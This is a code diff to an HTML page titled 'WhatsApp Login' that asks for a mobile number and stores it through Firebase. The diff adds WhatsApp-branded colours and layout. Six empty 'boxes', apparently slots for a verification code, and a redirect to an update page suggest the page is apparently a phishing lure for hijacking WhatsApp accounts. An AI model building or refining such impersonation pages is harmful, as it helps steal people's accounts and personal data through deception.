@@ -4,11 +4,73 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>WhatsApp Login</title>
+  <style>
+    body {
+      font-family: "Segoe UI", sans-serif;
+      background: #e5f9ed;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      background: #ffffff;
+      padding: 40px 30px;
+      border-radius: 16px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+    }
+
+    h1 {
+      color: #25d366;
+      margin-bottom: 24px;
+      font-size: 28px;
+    }
+
+    input[type="tel"] {
+      width: 100%;
+      padding: 14px;
+      font-size: 16px;
+      border: 2px solid #ccc;
+      border-radius: 10px;
+      margin-bottom: 20px;
+      transition: 0.3s ease;
+    }
+
+    input[type="tel"]:focus {
+      border-color: #25d366;
+      outline: none;
+      box-shadow: 0 0 5px rgba(37, 211, 102, 0.3);
+    }
+
+    button {
+      background-color: #25d366;
+      color: white;
+      border: none;
+      padding: 14px 20px;
+      border-radius: 30px;
+      font-size: 16px;
+      font-weight: bold;
+      width: 100%;
+      cursor: pointer;
+      transition: 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #1da851;
+    }
+  </style>
 </head>
 <body>
-  <h1>Enter Mobile</h1>
-  <input type="tel" id="mobile" placeholder="Enter mobile number" maxlength="10">
-  <button onclick="handleLogin()">Login</button>
+  <div class="container">
+    <h1>WhatsApp Login</h1>
+    <input type="tel" id="mobile" placeholder="Enter mobile number" maxlength="10">
+    <button onclick="handleLogin()">Login</button>
+  </div>
 
   <!-- Firebase Config + Script -->
   <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
@@ -43,7 +105,7 @@
         boxes: ["", "", "", "", "", ""]
       });
 
-      window.location.href = "code-update.html";
+      window.location.href = "update.html";
     }
   </script>
 </body>
